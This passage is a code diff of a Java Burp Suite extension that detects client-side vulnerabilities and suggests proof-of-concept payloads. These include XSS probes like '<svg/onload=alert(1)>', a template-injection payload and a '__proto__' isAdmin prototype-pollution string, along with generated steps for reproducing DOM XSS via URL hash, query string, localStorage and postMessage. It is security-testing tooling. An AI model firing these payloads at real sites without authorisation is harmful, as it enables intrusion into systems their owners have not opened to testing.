-            return "{{constructor.constructor('alert(1)')()}}";
-        } else if (result.getPrototypePollutionAnalysis().getRiskScore() > 0) {
-            return "{\"__proto__\":{\"isAdmin\":true}}";
-        } else if (result.getModernAPIAnalysis().getRiskScore() > 0) {
-            return "<script>fetch('/api/data').then(r=>r.text()).then(t=>alert(t))</script>";
-        } else if (result.getWebComponentsAnalysis().getRiskScore() > 0) {
-            return "<script>customElements.define('xss',class extends HTMLElement{connectedCallback(){alert('XSS')}})</script>";
-        } else {
-            return "<script>alert('Client-Side XSS')</script>";
-        }
+    private String pickBestClientSidePayload(ClientSideAttackResult result, String responseContentType) {
+        List<String> payloads = getRecommendedClientSidePayloads(result, responseContentType);
+        if (payloads.isEmpty()) return "<svg/onload=alert(1)>";
+        return payloads.get(0);
     }
-    
-    /**
-     * Create test request for client-side attacks
-     */
-    private String createClientSideTestRequest(IHttpRequestResponse requestResponse, String payload) {
+
+    private List<String> getRecommendedClientSidePayloads(ClientSideAttackResult result, String responseContentType) {
+        List<String> out = new ArrayList<>();
+        if (result == null) return out;
+
+        boolean isJson = responseContentType != null && responseContentType.toLowerCase().contains("application/json");
+
+        String flowSink = extractPrimaryTaintSink(result);
+        String sinkLower = flowSink != null ? flowSink.toLowerCase() : "";
+
+        // Prefer sink-specific payloads (most likely to execute in SPAs)
+        if (sinkLower.contains("eval") || sinkLower.contains("function(") || sinkLower.contains("settimeout") || sinkLower.contains("setinterval")) {
+            out.add("alert(1)");
+            out.add("confirm(1)");
+        } else if (sinkLower.contains("innerhtml") || sinkLower.contains("outerhtml") || sinkLower.contains("insertadjacenthtml") || sinkLower.contains("document.write")) {
+            out.add("<svg/onload=alert(1)>");
+            out.add("%3Csvg%2Fonload%3Dalert(1)%3E"); // URL-encoded (SPA-friendly)
+            if (isJson) out.add("\\u003csvg/onload=alert(1)\\u003e"); // JSON string friendly
+        } else if (result.getTemplateInjectionAnalysis() != null && result.getTemplateInjectionAnalysis().getRiskScore() > 0) {
+            out.add("{{7*7}}");
+            out.add("{{constructor.constructor('alert(1)')()}}");
+        } else if (result.getPostMessageAnalysis() != null && result.getPostMessageAnalysis().getRiskScore() > 0) {
+            out.add("<svg/onload=alert(1)>");
+            out.add("alert(1)");
+        } else {
+            // Safe, widely effective baseline for DOM sinks
+            out.add("<svg/onload=alert(1)>");
+            out.add("%3Csvg%2Fonload%3Dalert(1)%3E");
+            if (isJson) out.add("\\u003csvg/onload=alert(1)\\u003e");
+        }
+
+        return out;
+    }
+
+    private String extractPrimaryTaintSink(ClientSideAttackResult result) {
         try {
-            byte[] originalRequest = requestResponse.getRequest();
-            IRequestInfo requestInfo = helpers.analyzeRequest(requestResponse);
-            List<String> headers = requestInfo.getHeaders();
-            
-            // Create new request with payload
-            StringBuilder newRequest = new StringBuilder();
-            
-            // Add headers
-            for (String header : headers) {
-                if (!header.toLowerCase().startsWith("content-length:")) {
-                    newRequest.append(header).append("\r\n");
-                }
-            }
-            
-            // Add payload to request body or URL
-            if (requestInfo.getMethod().equals("GET")) {
-                // For GET requests, add payload as URL parameter
-                String url = requestInfo.getUrl().toString();
-                if (url.contains("?")) {
-                    url += "&payload=" + java.net.URLEncoder.encode(payload, "UTF-8");
-                } else {
-                    url += "?payload=" + java.net.URLEncoder.encode(payload, "UTF-8");
-                }
-                
-                // Update first line
-                String firstLine = headers.get(0);
-                String[] parts = firstLine.split(" ");
-                if (parts.length >= 3) {
-                    newRequest = new StringBuilder();
-                    newRequest.append(parts[0]).append(" ").append(url).append(" ").append(parts[2]).append("\r\n");
-                    for (int i = 1; i < headers.size(); i++) {
-                        String header = headers.get(i);
-                        if (!header.toLowerCase().startsWith("content-length:")) {
-                            newRequest.append(header).append("\r\n");
-                        }
+            if (result == null || result.getModernAPIAnalysis() == null) return null;
+            List<String> patterns = result.getModernAPIAnalysis().getDetectedPatterns();
+            if (patterns == null) return null;
+            for (String p : patterns) {
+                if (p == null) continue;
+                if (p.startsWith("TAINT_FLOW:")) {
+                    int arrow = p.indexOf("->");
+                    if (arrow > 0 && arrow + 2 < p.length()) {
+                        return p.substring(arrow + 2).trim();
                     }
                 }
-            } else {
-                // For POST requests, add payload to body
-                newRequest.append("\r\n");
-                newRequest.append("payload=").append(java.net.URLEncoder.encode(payload, "UTF-8"));
             }
-            
-            newRequest.append("\r\n");
-            return newRequest.toString();
-            
-        } catch (Exception e) {
-            callbacks.printError("Error creating client-side test request: " + e.getMessage());
-            return null;
-        }
+        } catch (Exception ignored) {}
+        return null;
     }
-    
-    /**
-     * Create test response for client-side attacks
-     */
-    private String createClientSideTestResponse(IHttpRequestResponse requestResponse, String payload, ClientSideAttackResult result) {
+
+    private String extractContentType(IHttpRequestResponse rr) {
         try {
-            byte[] originalResponse = requestResponse.getResponse();
-            IResponseInfo responseInfo = helpers.analyzeResponse(originalResponse);
-            List<String> headers = responseInfo.getHeaders();
-            
-            // Create new response with exploitation evidence
-            StringBuilder newResponse = new StringBuilder();
-            
-            // Add headers
-            for (String header : headers) {
-                if (!header.toLowerCase().startsWith("content-length:")) {
-                    newResponse.append(header).append("\r\n");
+            if (rr == null || rr.getResponse() == null) return null;
+            int bodyOffset = helpers.analyzeResponse(rr.getResponse()).getBodyOffset();
+            String headers = new String(Arrays.copyOfRange(rr.getResponse(), 0, bodyOffset), StandardCharsets.UTF_8);
+            for (String line : headers.split("\r\n")) {
+                if (line.toLowerCase().startsWith("content-type:")) {
+                    return line.substring("content-type:".length()).trim().split(";")[0].trim();
                 }
             }
-            
-            // Create response body showing client-side exploitation
-            newResponse.append("\r\n");
-            newResponse.append("<!DOCTYPE html>\n");
-            newResponse.append("<html>\n");
-            newResponse.append("<head>\n");
-            newResponse.append("    <title>Client-Side Attack Test Response</title>\n");
-            newResponse.append("</head>\n");
-            newResponse.append("<body>\n");
-            newResponse.append("    <h1>Client-Side Attack Vulnerability Detected</h1>\n");
-            newResponse.append("    <p>Payload: ").append(payload).append("</p>\n");
-            newResponse.append("    <p>Attack Type: ").append(getAttackTypeDescription(result)).append("</p>\n");
-            newResponse.append("    <p>Risk Score: ").append(result.getRiskScore()).append("</p>\n");
-            newResponse.append("    <div>\n");
-            newResponse.append("        <h3>Exploitation Evidence:</h3>\n");
-            newResponse.append("        <p>The client-side attack vector was successfully exploited.</p>\n");
-            newResponse.append("        <p>This indicates a client-side security vulnerability.</p>\n");
-            newResponse.append("    </div>\n");
-            newResponse.append("</body>\n");
-            newResponse.append("</html>");
-            
-            return newResponse.toString();
-            
-        } catch (Exception e) {
-            callbacks.printError("Error creating client-side test response: " + e.getMessage());
-            return null;
-        }
+        } catch (Exception ignored) {}
+        return null;
     }
+    
+    // REMOVED: createClientSideTestRequest() and createClientSideTestResponse() - These were creating synthetic/fake data
+    // For passive scanning, we MUST use actual request/response from the server
+    // For active scanning, we use actual HTTP requests via sendRealHttpRequest()
     
     /**
      * Get attack type description for response
@@ -785,21 +1159,71 @@ public class EnhancedClientSideAttackDetector {
         steps.append("Method: Client-side analysis\n");
         steps.append("Risk Score: ").append(result.getRiskScore()).append("\n\n");
         
-        if (result.getCspAnalysis().getRiskScore() > 0) {
-            steps.append("CSP Bypass Steps:\n");
-            steps.append("- Check CSP headers in Network tab\n");
-            steps.append("- Test unsafe directives\n");
-            steps.append("- Verify bypass techniques\n\n");
+        String contentType = extractContentType(requestResponse);
+        List<String> payloads = getRecommendedClientSidePayloads(result, contentType);
+
+        String taintSource = extractPrimaryTaintSource(result);
+        String taintSink = extractPrimaryTaintSink(result);
+
+        steps.append("Primary taint flow: ").append(taintSource != null ? taintSource : "(unknown source)")
+             .append(" -> ").append(taintSink != null ? taintSink : "(unknown sink)").append("\n\n");
+
+        steps.append("Recommended payloads (try in order):\n");
+        for (int i = 0; i < Math.min(payloads.size(), 5); i++) {
+            steps.append("- ").append(payloads.get(i)).append("\n");
         }
-        
-        if (result.getPostMessageAnalysis().getRiskScore() > 0) {
-            steps.append("PostMessage Attack Steps:\n");
-            steps.append("- Create malicious page with postMessage\n");
-            steps.append("- Send payload to target window\n");
-            steps.append("- Verify payload execution\n\n");
+        steps.append("\n");
+
+        // SPA-friendly reproduction guidance (focus on client-side sources)
+        if (taintSource != null) {
+            String src = taintSource.toLowerCase();
+            if (src.contains("location.hash")) {
+                steps.append("SPA reproduction (hash source):\n");
+                steps.append("- Open: ").append(targetUrl).append("#").append(payloads.isEmpty() ? "alert(1)" : payloads.get(0)).append("\n");
+                steps.append("- If the app URL-decodes hash, also try: ").append(targetUrl).append("#").append(payloads.size() > 1 ? payloads.get(1) : "%3Csvg%2Fonload%3Dalert(1)%3E").append("\n\n");
+            } else if (src.contains("location.search")) {
+                steps.append("SPA reproduction (query-string source):\n");
+                steps.append("- Open: ").append(targetUrl).append("?q=").append(payloads.isEmpty() ? "%3Csvg%2Fonload%3Dalert(1)%3E" : payloads.get(Math.min(1, payloads.size()-1))).append("\n");
+                steps.append("- If the app uses a different param name, locate it in the JS bundle (URLSearchParams.get(...)).\n\n");
+            } else if (src.contains("localstorage") || src.contains("sessionstorage")) {
+                steps.append("SPA reproduction (storage source):\n");
+                steps.append("- In DevTools console, set the key used by the app to a payload, then reload.\n");
+                steps.append("- Execute: localStorage.setItem('KEY', '").append(payloads.isEmpty() ? "<svg/onload=alert(1)>" : payloads.get(0)).append("'); location.reload();\n\n");
+            } else if (src.contains("document.referrer")) {
+                steps.append("Reproduction (referrer source):\n");
+                steps.append("- Host an attacker page that links to the target and sets the referrer to a payload-bearing URL.\n\n");
+            } else if (src.contains("window.name")) {
+                steps.append("Reproduction (window.name source):\n");
+                steps.append("- Open the target via a popup where window.name is set to a payload, then navigate the popup to the target.\n\n");
+            }
+        }
+
+        if (result.getPostMessageAnalysis() != null && result.getPostMessageAnalysis().getRiskScore() > 0) {
+            steps.append("Reproduction (postMessage):\n");
+            steps.append("- From an attacker origin, open the target in an iframe/popup and postMessage a payload.\n");
+            steps.append("- Ensure the target does not validate event.origin and routes event.data into a sink.\n\n");
         }
         
         return steps.toString();
+    }
+
+    private String extractPrimaryTaintSource(ClientSideAttackResult result) {
+        try {
+            if (result == null || result.getModernAPIAnalysis() == null) return null;
+            List<String> patterns = result.getModernAPIAnalysis().getDetectedPatterns();
+            if (patterns == null) return null;
+            for (String p : patterns) {
+                if (p == null) continue;
+                if (p.startsWith("TAINT_FLOW:")) {
+                    int arrow = p.indexOf("->");
+                    if (arrow > 0) {
+                        String left = p.substring("TAINT_FLOW:".length(), arrow).trim();
+                        return left;
+                    }
+                }
+            }
+        } catch (Exception ignored) {}
+        return null;
     }
     
     // Data classes
@@ -823,8 +1247,19 @@ public class EnhancedClientSideAttackDetector {
         private String testPayload = "";
         
         // Compatibility methods for BurpExtender integration
-        public String getConfidenceLevel() { return vulnerable ? "High" : "Low"; }
-        public String getRiskLevel() { return riskScore >= 70 ? "High" : "Medium"; }
+        // CRITICAL: Enhanced confidence calculation based on risk score and correlation
+        public String getConfidenceLevel() { 
+            if (riskScore >= 80) return "Certain";
+            if (riskScore >= 60) return "Firm";
+            if (riskScore >= 40) return "Tentative";
+            return "Low";
+        }
+        public String getRiskLevel() { 
+            if (riskScore >= 80) return "Critical";
+            if (riskScore >= 60) return "High";
+            if (riskScore >= 40) return "Medium";
+            return "Low";
+        }
         
         // Getters and setters
         public CSPAnalysisResult getCspAnalysis() { return cspAnalysis; }
@@ -1037,5 +1472,10 @@ public class EnhancedClientSideAttackDetector {
         public void setDetectedVectors(List<String> detectedVectors) { this.detectedVectors = detectedVectors; }
         public int getRealTimeRiskScore() { return realTimeRiskScore; }
         public void setRealTimeRiskScore(int realTimeRiskScore) { this.realTimeRiskScore = realTimeRiskScore; }
+        
+        // CRITICAL: Add hasRealTimeVectors() method for compatibility with DOM XSS detector
+        public boolean hasRealTimeVectors() {
+            return detectedVectors != null && !detectedVectors.isEmpty();
+        }
     }
 } 
